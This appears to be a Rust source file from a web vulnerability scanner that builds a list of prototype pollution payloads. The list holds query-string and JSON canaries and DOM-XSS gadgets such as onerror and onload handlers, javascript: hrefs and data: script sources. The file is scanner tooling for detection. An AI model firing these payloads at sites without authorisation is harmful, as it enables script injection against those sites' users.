/// Payloads that exercise client-side prototype pollution through the common
/// query-string and JSON merge shapes.
///
/// The payload family is deliberately dual-purpose:
///
/// * the `*[polluted]` and `*.polluted` entries are canaries that prove a
///   recursive merge accepted an attacker-controlled key;
/// * the gadget entries (`innerHTML`, `src`, `onload`, ...) turn the same
///   pollution into a DOM-XSS sink when the page reads a polluted property.
///
/// Every entry carries a scan marker so the existing reflection and DOM
/// verification paths can identify a hit. The `${…}` JSON forms are ordinary
/// strings on the wire, so URL/HTML encoders treat them the same way they
/// treat every other payload.
pub(crate) fn get_prototype_pollution_payloads() -> Vec<String> {
    static CACHE: std::sync::LazyLock<Vec<String>> = std::sync::LazyLock::new(|| {
        let templates = [
            // Canary-only shapes: prove a merge/copy accepted `__proto__`.
            "__proto__[polluted]={ID}",
            "constructor[prototype][polluted]={ID}",
            "__proto__.polluted={ID}",
            "constructor.prototype.polluted={ID}",
            "__proto__%5Bpolluted%5D={ID}",
            "constructor%5Bprototype%5D%5Bpolluted%5D={ID}",
            // Gadgets that reach an HTML/URL/event sink when a library later
            // reads the polluted property.
            "__proto__[innerHTML]=<img src=x onerror=alert(1) class={CLASS}>",
            "constructor[prototype][innerHTML]=<img src=x onerror=alert(1) class={CLASS}>",
            "__proto__[outerHTML]=<img src=x onerror=alert(1) class={CLASS}>",
            "__proto__[html]=<svg onload=alert(1) class={CLASS}>",
            "constructor[prototype][html]=<svg onload=alert(1) class={CLASS}>",
            "__proto__[src]=data:text/javascript,alert(1)//{CLASS}",
            "constructor[prototype][src]=data:text/javascript,alert(1)//{CLASS}",
            "__proto__[href]=javascript:alert(1)//{CLASS}",
            "constructor[prototype][href]=javascript:alert(1)//{CLASS}",
            "__proto__[onload]=alert(1)//{CLASS}",
            "__proto__[onerror]=alert(1)//{CLASS}",
            // PortSwigger's DOM-XSS-via-prototype-pollution gadget spelling.
            "__proto__[transport_url]=data:,alert(1)//{CLASS}",
            "__proto__[data]=<img src=x onerror=alert(1) class={CLASS}>",
            // JSON-body spellings for APIs that merge parsed objects.
            "{\"__proto__\":{\"polluted\":\"{ID}\",\"innerHTML\":\"<img src=x onerror=alert(1) class={CLASS}>\"}}",
            "{\"constructor\":{\"prototype\":{\"innerHTML\":\"<img src=x onerror=alert(1) class={CLASS}>\"}}}",
        ];

        let mut out = Vec::with_capacity(templates.len());
        let mut seen = std::collections::HashSet::new();
        for template in templates {
            let payload = crate::scanning::markers::fill_markers(template);
            if seen.insert(payload.clone()) {
                out.push(payload);
            }
        }
        out
    });
    CACHE.clone()
}

#[cfg(test)]
mod tests;
